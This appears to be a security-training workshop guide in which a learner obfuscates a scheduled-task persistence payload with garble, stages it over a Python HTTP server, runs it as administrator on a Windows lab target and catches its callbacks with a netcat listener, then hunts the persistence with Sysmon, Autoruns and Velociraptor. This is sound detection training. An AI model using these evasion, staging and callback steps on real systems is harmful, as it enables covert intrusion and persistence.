# Scheduled Tasks Workshop Instructions


## Create the payload.

1. In the Attack Desktop, open a terminal, navigate to the  ironcat_attack/c2/ichttpc2 folder.
`cd /home/pslearner/workshop/ironcat_attack/persistence/scheduled_tasks`

2. Notice the already compiled client.exe file.  Check it's md5 hash using md5sum.
`md5sum icschtasks.exe`

3. Now use garble to generate a new version with obfuscation.
`garble -tiny -literals -seed=random build -ldflags='-s -w' icschtasks.go`

4. Time to move the payload over to the Windows Target. Host the file using python http simple server.
`python3 -m http.server`

5. Use the drop down in the top left to connect to the Windows Target device.

6. Open a firefox browser window and browse to http:172.32.14.10:8000

7. Click **icschtasks.exe** to download it to the device.

8. If there are warnings from smart screen, acknoledge them and choose "keep anyway"
Note: this is not the same service as windows defender, it is an artifact of us using the browser to move it over, not the payload being caught by anti-virus.

## Setup Listener And Run Persistence

The payload will generate persistence with a scheduled task and call back out to prove it. But you have to be listening.

1. On the Attacker Desktop, open a new terminal window.
2. Run a net cat listnener on port 666.
`sudo nc -lvnp 666`
3. Switch back to the Windows Target.
4. Use the desktop icon for CMD. Right click, and choose 'Run As Administrator'

5. Change directory to the downloads folder. (This one is a little tricky.)
`cd C:\Users\pslearner.PS-WIN-1\Downloads`

6. Run the payload. With arguments.
`icschtasks.exe 1 1`
Note: Unless something has changed significantly for the worse for my workshop, you should have ZERO notifications from anti-virus.

7. Swap back to your Attack Desktop, inpsect the terminal where you ran the server executable. You will see connections from the persistence after about a minute or so..  It will attempt again every minute or so, you will need to restart the netcat listener to catch it a gain. No interaction is required.

This is clearly simulated, popups would not normally happen, and you wouldn't normally have this much information about what caused the persistence.  Now you should use the tools on the device to track down what exactly is going on here. 

Some tools that may be helpful for this are:
- Sysmon Logs in Windows Event Viewer or with powershell
- Hunt for persistence with Autoruns
- Use velociraptor queires for persistence

Questions you want to answer here include:

What exactly did the executable do?

What are names of files, where are they, and what do they do.

What is the name of the scheduled task, and how could you detect it as malicous in an enterprise environment.

- [IOCs](./schtasks_IOCs.md)
